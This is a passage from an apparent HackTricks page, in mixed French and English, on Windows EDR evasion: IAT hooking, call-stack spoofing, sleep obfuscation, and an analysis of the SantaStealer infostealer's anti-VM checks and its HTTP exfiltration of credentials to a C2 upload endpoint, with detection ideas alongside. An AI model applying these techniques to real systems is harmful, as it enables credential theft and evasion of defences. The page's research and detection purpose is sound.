//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Remarques
- Appliquer le patch après relocations/ASLR et avant la première utilisation de l'import. Reflective loaders like TitanLdr/AceLdr démontrent le hooking durant DllMain du module chargé.
- Garder les wrappers compacts et PIC-safe ; résoudre l'API réelle via la valeur IAT originale que vous avez capturée avant le patch ou via LdrGetProcedureAddress.
- Utiliser des transitions RW → RX pour le PIC et éviter de laisser des pages writable+executable.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- Cela contourne les détections qui s'attendent à des piles canoniques from Beacon/BOFs to sensitive APIs.
- Associer avec les techniques stack cutting/stack stitching pour atterrir à l'intérieur des frames attendues avant le prologue de l'API.

Intégration opérationnelle
- Préfixez le reflective loader aux DLLs post‑ex afin que le PIC et les hooks s'initialisent automatiquement lorsque la DLL est chargée.
- Utilisez un script Aggressor pour enregistrer les target APIs afin que Beacon et BOFs bénéficient de manière transparente du même chemin d'évasion sans modification de code.

Considérations Détection/DFIR
- IAT integrity : entrées qui résolvent vers des adresses non‑image (heap/anon) ; vérification périodique des import pointers.
- Stack anomalies : adresses de retour n'appartenant pas aux images chargées ; transitions abruptes vers PIC non‑image ; RtlUserThreadStart ancestry incohérente.
- Loader telemetry : écritures in‑process dans l'IAT, activité DllMain précoce qui modifie les import thunks, régions RX inattendues créées au chargement.
- Image‑load evasion : si hooking LoadLibrary*, surveiller les chargements suspects d'automation/clr assemblies corrélés avec des memory masking events.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

If you control a reflective loader, you can hook imports **during** `ProcessImports()` by replacing the loader's `GetProcAddress` pointer with a custom resolver that checks hooks first:

- Construisez un **resident PICO** (objet PIC persistant) qui survit après que le PIC loader transitoire s'est libéré.
- Exportez une fonction `setup_hooks()` qui écrase le import resolver du loader (p.ex., `funcs.GetProcAddress = _GetProcAddress`).
- Dans `_GetProcAddress`, skip ordinal imports et utilisez une recherche de hook basée sur hash comme `__resolve_hook(ror13hash(name))`. Si un hook existe, return it ; sinon déléguez au vrai `GetProcAddress`.
- Enregistrez les hook targets à la link time avec Crystal Palace `addhook "MODULE$Func" "hook"` entries. Le hook reste valide car il vit à l'intérieur du resident PICO.

Cela produit une **import-time IAT redirection** sans patcher la section code de la DLL chargée après le load.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks ne se déclenchent que si la fonction est réellement dans l'IAT de la cible. Si un module résout des APIs via un PEB-walk + hash (pas d'entrée d'import), forcez un import réel pour que le chemin `ProcessImports()` du loader le voie :

- Remplacez la résolution d'export hashée (p.ex., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) par une référence directe comme `&WaitForSingleObject`.
- Le compilateur émet une entrée IAT, permettant l'interception lorsque le reflective loader résout les imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Au lieu de patcher `Sleep`, hookez les **vraies primitives wait/IPC** utilisées par l'implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Pour les attentes longues, encapsulez l'appel dans une chaîne d'obfuscation de type Ekko qui chiffre l'image en mémoire pendant l'inactivité :

- Utilisez `CreateTimerQueueTimer` pour planifier une séquence de callbacks qui appellent `NtContinue` avec des `CONTEXT` frames fabriqués.
- Chaîne typique (x64) : mettre l'image en `PAGE_READWRITE` → chiffrer en RC4 via `advapi32!SystemFunction032` sur l'image mappée complète → effectuer l'attente bloquante → déchiffrer RC4 → **restaurer les permissions par section** en parcourant les sections PE → signaler la complétion.
- `RtlCaptureContext` fournit un template `CONTEXT` ; clonez‑le dans plusieurs frames et définissez les registres (`Rip/Rcx/Rdx/R8/R9`) pour invoquer chaque étape.

Détail opérationnel : renvoyer “success” pour les attentes longues (p.ex., `WAIT_OBJECT_0`) afin que l'appelant continue pendant que l'image est masquée. Ce pattern cache le module aux scanners durant les fenêtres d'inactivité et évite la signature classique “patched `Sleep()`”.

Idées de détection (basées sur la télémétrie)
- Rafales de callbacks `CreateTimerQueueTimer` pointant vers `NtContinue`.
- `advapi32!SystemFunction032` utilisé sur de larges buffers contigus de la taille d'une image.
- `VirtualProtect` sur une large plage suivi d'une restauration personnalisée des permissions par section.


## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustre comment les info-stealers modernes combinent AV bypass, anti-analysis et credential access dans un seul workflow.

### Keyboard layout gating & sandbox delay

- Un flag de config (`anti_cis`) énumère les keyboard layouts installés via `GetKeyboardLayoutList`. Si un layout cyrillique est trouvé, l'échantillon dépose un marqueur vide `CIS` et se termine avant d'exécuter les stealers, s'assurant de ne jamais se déclencher sur les locales exclues tout en laissant un artefact pour la chasse.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Logique `check_antivm` en couches

- La variante A parcourt la liste des processus, hache chaque nom avec un checksum roulant personnalisé, et le compare à des blocklists intégrées pour débogueurs/sandboxes ; elle répète le checksum sur le nom de l'ordinateur et vérifie des répertoires de travail tels que `C:\analysis`.
- La variante B inspecte les propriétés système (plancher du nombre de processus, uptime récent), appelle `OpenServiceA("VBoxGuest")` pour détecter les additions VirtualBox, et effectue des vérifications de timing autour des sleep pour repérer l'exécution pas à pas. Toute détection entraîne l'abandon avant le lancement des modules.

### Fileless helper + chargement réflexif double ChaCha20

- Le DLL/EXE principal intègre un Chromium credential helper qui est soit déposé sur disque, soit mappé manuellement en mémoire ; le mode fileless résout lui‑même les imports/relocations afin qu'aucun artefact du helper ne soit écrit.
- Ce helper stocke une DLL de second stade chiffrée deux fois avec ChaCha20 (deux clés de 32 octets + nonces de 12 octets). Après les deux passes, il charge le blob de manière réflexive (pas de `LoadLibrary`) et appelle les exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` dérivés de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Les routines ChromElevator utilisent direct-syscall reflective process hollowing pour injecter dans un navigateur Chromium en cours d'exécution, hériter des clés AppBound Encryption, et décrypter mots de passe/cookies/cartes de crédit directement depuis les bases SQLite malgré le durcissement ABE.

### Collecte modulaire en mémoire et exfiltration HTTP par chunks

- `create_memory_based_log` itère sur une table de pointeurs de fonction globale `memory_generators` et crée un thread par module activé (Telegram, Discord, Steam, captures d'écran, documents, extensions de navigateur, etc.). Chaque thread écrit les résultats dans des buffers partagés et rapporte le nombre de fichiers après une fenêtre de jointure d'environ 45 s.
- Une fois terminé, tout est zippé avec la bibliothèque statiquement liée `miniz` sous `%TEMP%\\Log.zip`. `ThreadPayload1` dort ensuite 15 s et stream l'archive en chunks de 10 MB via HTTP POST vers `http://<C2>:6767/upload`, usurpant la boundary `multipart/form-data` d'un navigateur (`----WebKitFormBoundary***`). Chaque chunk ajoute `User-Agent: upload`, `auth: <build_id>`, optionnellement `w: <campaign_tag>`, et le dernier chunk ajoute `complete: true` afin que le C2 sache que le réassemblage est terminé.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
